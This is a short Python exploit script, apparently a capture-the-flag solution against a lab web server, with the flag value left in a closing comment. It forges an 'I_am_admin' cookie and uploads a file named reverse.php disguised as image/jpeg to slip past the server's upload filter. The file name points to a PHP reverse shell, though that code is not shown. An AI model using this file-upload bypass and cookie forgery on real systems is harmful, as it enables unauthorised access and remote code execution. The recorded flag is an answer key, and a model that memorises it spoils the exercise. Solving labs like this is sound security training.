import requests

url = "http://192.168.122.213/?page=upload"

cookies = {
    "I_am_admin": "68934a3e9455fa72420237eb05902327"
}

with open('reverse.php', 'rb') as f:
    file_data = f.read()

files = {
    "MAX_FILE_SIZE": (None, "100000"),
    "uploaded": ("reverse.php", file_data, "image/jpeg"),
    "Upload": (None, "Upload"),
}

r = requests.post(url, files=files, cookies=cookies)

with open('response.html', 'w') as f:
    f.write(r.text)

print(r.status_code)
# flag is 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8